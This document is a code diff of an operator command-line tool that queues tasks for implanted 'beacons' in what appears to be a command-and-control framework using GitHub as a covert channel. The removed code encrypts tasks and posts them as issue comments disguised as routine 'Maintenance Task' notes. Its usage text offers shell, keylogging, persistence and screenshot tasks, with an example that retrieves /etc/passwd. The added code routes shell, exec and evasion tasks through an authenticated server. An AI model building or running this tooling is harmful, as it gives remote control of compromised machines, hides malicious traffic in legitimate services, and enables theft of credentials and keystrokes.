@@ -1,242 +1,153 @@
 /**
- * octoctl task
+ * Queue a task through the authenticated controller API.
  *
- * Queue a task for a beacon by posting an encrypted deploy comment directly
- * to the beacon's GitHub issue. Does NOT require a running server — the
- * operator acts as the delivery authority.
- *
- * Usage:
- *   octoctl task <beaconId> --kind shell --cmd "id"
- *   octoctl task <beaconId> --kind shell --cmd "whoami" --cmd-args "--no-login"
- *   octoctl task <beaconId> --kind download --remote-path /etc/passwd
- *   octoctl task <beaconId> --kind sleep --seconds 300
- *   octoctl task <beaconId> --kind die
- *
- * Supported task kinds: shell, upload, download, screenshot, keylog,
- *                       persist, unpersist, sleep, die, load-module
- *
- * The task payload is a JSON array (same format the server uses) encrypted
- * with crypto_box to the beacon's X25519 public key.
+ * The server's durable TaskService is the only task authority, including for
+ * the Issues channel. It validates the shared contract, persists the task, and
+ * lets the selected channel claim it under a delivery lease.
  */
 
-import { resolveEnv }           from "../lib/env.ts";
-import { getBeacon }            from "../lib/registry.ts";
-import { encryptForBeacon, base64ToBytes } from "../lib/crypto.ts";
+import {
+  SELECTABLE_CHANNEL_KINDS,
+  assertTaskArgs,
+  isTaskKind,
+  type ChannelKind,
+  type TaskArgs,
+  type TaskKind as ProtocolTaskKind,
+} from "@octoc2/shared";
+import {
+  controllerFetch,
+  requireControllerServerUrl,
+  requireOperatorApiToken,
+} from "../lib/env.ts";
+import { getBeacon } from "../lib/registry.ts";
 
-// ── Task argument types ────────────────────────────────────────────────────────
+export type TaskKind = ProtocolTaskKind;
 
-export type TaskKind =
-  | "shell"
-  | "upload"
-  | "download"
-  | "screenshot"
-  | "keylog"
-  | "persist"
-  | "unpersist"
-  | "sleep"
-  | "die"
-  | "load-module";
+export const VALID_TENTACLE_KINDS = new Set<ChannelKind>(
+  SELECTABLE_CHANNEL_KINDS,
+);
 
-export const VALID_TENTACLE_KINDS = new Set([
-  "issues", "branch", "actions", "proxy", "codespaces",
-  "http", "relay", "gist", "oidc", "notes", "secrets",
-] as const);
-
-export type TentacleKind = typeof VALID_TENTACLE_KINDS extends Set<infer T> ? T : never;
+export type TentacleKind = ChannelKind;
 
 export interface TaskOptions {
-  kind:             TaskKind;
-  cmd?:             string | undefined;
-  localPath?:       string | undefined;
-  remotePath?:      string | undefined;
-  seconds?:         number | undefined;
-  argsJson?:        string | undefined;
-  /** If set, only deliver via this tentacle channel */
-  tentacle?:        string | undefined;
+  kind: TaskKind;
+  cmd?: string | undefined;
+  seconds?: number | undefined;
+  argsJson?: string | undefined;
+  /** If set, only deliver via this channel. */
+  tentacle?: string | undefined;
 }
 
-// ── Comment format ─────────────────────────────────────────────────────────────
-
-function buildDeployComment(ref: string, nonce: string, ciphertext: string): string {
-  const epoch = Math.floor(Date.now() / 1000);
-  return [
-    // Invisible to viewers; parsed by the beacon's pollForDeployComments
-    `<!-- job:${epoch}:deploy:${ref} -->`,
-    "",
-    `### 📌 Maintenance Task · Ref \`${ref}\``,
-    "",
-    "Automated maintenance task queued for execution.",
-    "",
-    "<details>",
-    "<summary>Operation parameters</summary>",
-    "",
-    "```text",
-    ciphertext,
-    "```",
-    "",
-    "</details>",
-    `<!-- ${nonce} -->`,
-  ].join("\n");
-}
-
-// ── Build task args from options ──────────────────────────────────────────────
-
-function buildTaskArgs(opts: TaskOptions): Record<string, unknown> {
+function buildTaskArgs(opts: TaskOptions): TaskArgs {
   if (opts.argsJson) {
-    return JSON.parse(opts.argsJson) as Record<string, unknown>;
+    let parsed: unknown;
+    try {
+      parsed = JSON.parse(opts.argsJson);
+    } catch (error) {
+      throw new Error(
+        `--args-json must be valid JSON: ${(error as Error).message}`,
+      );
+    }
+    return assertTaskArgs(opts.kind, parsed);
   }
+
   switch (opts.kind) {
     case "shell":
       if (!opts.cmd) throw new Error("--kind shell requires --cmd");
-      return { cmd: opts.cmd };
-    case "upload":
-      if (!opts.localPath || !opts.remotePath)
-        throw new Error("--kind upload requires --local-path and --remote-path");
-      return { localPath: opts.localPath, remotePath: opts.remotePath };
-    case "download":
-      if (!opts.remotePath) throw new Error("--kind download requires --remote-path");
-      return { remotePath: opts.remotePath };
+      return assertTaskArgs("shell", { cmd: opts.cmd });
+    case "exec":
+      if (!opts.cmd) {
+        throw new Error("--kind exec requires --cmd or --args-json");
+      }
+      return assertTaskArgs("exec", { cmd: opts.cmd });
     case "sleep":
-      if (opts.seconds === undefined) throw new Error("--kind sleep requires --seconds");
-      return { seconds: opts.seconds };
-    case "load-module":
-      if (!opts.argsJson) throw new Error("--kind load-module requires --args-json '{\"name\":\"...\",\"serverUrl\":\"...\"}'");
-      return JSON.parse(opts.argsJson) as Record<string, unknown>;
-    case "die":
-    case "screenshot":
-    case "keylog":
-    case "persist":
-    case "unpersist":
-      return {};
-    default:
-      return {};
+      if (opts.seconds === undefined) {
+        throw new Error("--kind sleep requires --seconds");
+      }
+      return assertTaskArgs("sleep", { seconds: opts.seconds });
+    case "ping":
+      return assertTaskArgs("ping", {});
+    case "kill":
+      return assertTaskArgs("kill", {});
+    case "evasion":
+      throw new Error(
+        "--kind evasion requires --args-json with an explicit action",
+      );
   }
 }
 
-// ── Main ───────────────────────────────────────────────────────────────────────
-
-export async function runTask(beaconIdPrefix: string, opts: TaskOptions): Promise<void> {
-  const env = await resolveEnv();
-
-  // Validate --tentacle kind if provided
-  if (opts.tentacle !== undefined && !VALID_TENTACLE_KINDS.has(opts.tentacle as TentacleKind)) {
-    console.error(
-      `\n  Error: --tentacle '${opts.tentacle}' is not a valid tentacle kind.`
-    );
-    console.error(
-      `  Valid kinds: ${[...VALID_TENTACLE_KINDS].join(", ")}\n`
-    );
-    process.exit(1);
+export async function runTask(
+  beaconIdPrefix: string,
+  opts: TaskOptions,
+): Promise<void> {
+  if (!isTaskKind(opts.kind)) {
+    throw new Error(`Unsupported task kind '${String(opts.kind)}'`);
   }
 
-  // Resolve beacon
-  const beacon = await getBeacon(beaconIdPrefix, env.dataDir);
+  if (
+    opts.tentacle !== undefined &&
+    !VALID_TENTACLE_KINDS.has(opts.tentacle as TentacleKind)
+  ) {
+    throw new Error(
+      `--tentacle '${opts.tentacle}' is invalid; valid channels: ` +
+        [...VALID_TENTACLE_KINDS].join(", "),
+    );
+  }
+  const preferredChannel = opts.tentacle as ChannelKind | undefined;
+
+  const dataDir = process.env["OCTOC2_DATA_DIR"]?.trim() ?? "./data";
+  const beacon = await getBeacon(beaconIdPrefix, dataDir);
   if (!beacon) {
-    console.error(
-      `\n  Beacon '${beaconIdPrefix}' not found in registry (${env.dataDir}/registry.json).`
+    throw new Error(
+      `Beacon '${beaconIdPrefix}' was not found in ${dataDir}/octoc2.sqlite`,
     );
-    console.error("  Run: octoctl beacons  to list registered beacons.\n");
-    process.exit(1);
   }
 
-  // Build task payload
-  const taskId = crypto.randomUUID();
-  const ref    = taskId.replace(/-/g, "").slice(0, 8);
-  const args   = buildTaskArgs(opts);
-
-  const taskPayload: {
-    taskId: string;
-    kind: string;
-    args: Record<string, unknown>;
-    ref: string;
-    preferredChannel?: string;
-  } = {
-    taskId,
-    kind: opts.kind,
-    args,
-    ref,
-    ...(opts.tentacle !== undefined && { preferredChannel: opts.tentacle }),
-  };
-
-  const taskArray = [taskPayload];
-
-  const DIM  = "\x1b[2m";
-  const BOLD = "\x1b[1m";
-  const RESET = "\x1b[0m";
-  const GREEN = "\x1b[32m";
-
-  // ── Delivery: server API vs direct Issues comment ───────────────────────
-  // Non-issues channels (actions, notes, branch, etc.) need the server to
-  // deliver the task through the appropriate channel. Issues can be posted
-  // directly as a comment.
-  const useServerApi = beacon.issueNumber === 0 || (
-    opts.tentacle !== undefined && opts.tentacle !== "issues"
-  );
-
-  if (useServerApi) {
-    // Deliver via server HTTP API — server routes to the correct channel
-    const serverUrl = process.env["OCTOC2_SERVER_URL"] ?? "http://localhost:8080";
-    const resp = await fetch(`${serverUrl}/api/beacon/${beacon.beaconId}/task`, {
+  const args = buildTaskArgs(opts);
+  const serverUrl = requireControllerServerUrl();
+  const operatorApiToken = requireOperatorApiToken();
+  const response = await controllerFetch(
+    `${serverUrl}/api/beacon/${encodeURIComponent(beacon.beaconId)}/task`,
+    {
       method: "POST",
       headers: {
-        "Authorization": `Bearer ${env.token}`,
+        Authorization: `Bearer ${operatorApiToken}`,
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
         kind: opts.kind,
         args,
-        ...(opts.tentacle !== undefined && { preferredChannel: opts.tentacle }),
+        ...(preferredChannel !== undefined && { preferredChannel }),
       }),
-    });
-
-    if (!resp.ok) {
-      const text = await resp.text();
-      throw new Error(`Server returned ${resp.status}: ${text}`);
-    }
-
-    console.log("");
-    console.log(`  ${GREEN}✓${RESET} Task queued via server API`);
-    console.log(`  ${DIM}Task ID:${RESET}  ${taskId}`);
-    console.log(`  ${DIM}Kind:${RESET}     ${opts.kind}`);
-    console.log(`  ${DIM}Args:${RESET}     ${JSON.stringify(args)}`);
-    if (opts.tentacle !== undefined) {
-      console.log(`  ${DIM}Channel:${RESET}  ${opts.tentacle}`);
-    }
-    console.log(`  ${DIM}Beacon:${RESET}   ${beacon.beaconId}`);
-  } else {
-    // Direct Issues comment delivery
-    const beaconPublicKey = await base64ToBytes(beacon.publicKey);
-    const { nonce, ciphertext } = await encryptForBeacon(
-      JSON.stringify(taskArray),
-      beaconPublicKey,
-      env.operatorSecretKey
+    },
+  );
+  if (!response.ok) {
+    throw new Error(
+      `Server returned ${response.status}: ${await response.text()}`,
     );
-
-    const body = buildDeployComment(ref, nonce, ciphertext);
-
-    const resp = await env.octokit.rest.issues.createComment({
-      owner:        env.owner,
-      repo:         env.repo,
-      issue_number: beacon.issueNumber,
-      body,
-    });
-
-    console.log("");
-    console.log(`  ${GREEN}✓${RESET} Task queued`);
-    console.log(`  ${DIM}Task ID:${RESET}  ${taskId}`);
-    console.log(`  ${DIM}Ref:${RESET}      ${ref}`);
-    console.log(`  ${DIM}Kind:${RESET}     ${opts.kind}`);
-    console.log(`  ${DIM}Args:${RESET}     ${JSON.stringify(args)}`);
-    if (opts.tentacle !== undefined) {
-      console.log(`  ${DIM}Channel:${RESET}  ${opts.tentacle}`);
-    }
-    console.log(`  ${DIM}Beacon:${RESET}   ${beacon.beaconId} (${beacon.hostname})`);
-    console.log(`  ${DIM}Issue:${RESET}    #${beacon.issueNumber}`);
-    console.log(`  ${DIM}Comment:${RESET}  ${resp.data.html_url}`);
+  }
+  const queued = await response.json() as { taskId?: unknown };
+  if (typeof queued.taskId !== "string" || queued.taskId.length === 0) {
+    throw new Error("Server response did not include a taskId");
   }
 
+  const dim = "\x1b[2m";
+  const bold = "\x1b[1m";
+  const reset = "\x1b[0m";
+  const green = "\x1b[32m";
   console.log("");
-  console.log(`  ${BOLD}Waiting for beacon to check in…${RESET}`);
-  console.log(`  Run: octoctl results ${beaconIdPrefix}  to see the output`);
+  console.log(`  ${green}✓${reset} Task queued via durable server API`);
+  console.log(`  ${dim}Task ID:${reset}  ${queued.taskId}`);
+  console.log(`  ${dim}Kind:${reset}     ${opts.kind}`);
+  console.log(`  ${dim}Args:${reset}     ${JSON.stringify(args)}`);
+  if (preferredChannel !== undefined) {
+    console.log(`  ${dim}Channel:${reset}  ${preferredChannel}`);
+  }
+  console.log(`  ${dim}Beacon:${reset}   ${beacon.beaconId}`);
+  console.log("");
+  console.log(`  ${bold}Waiting for beacon to check in…${reset}`);
+  console.log(
+    `  Run: octoctl results ${beaconIdPrefix}  to see verified output`,
+  );
   console.log("");
 }
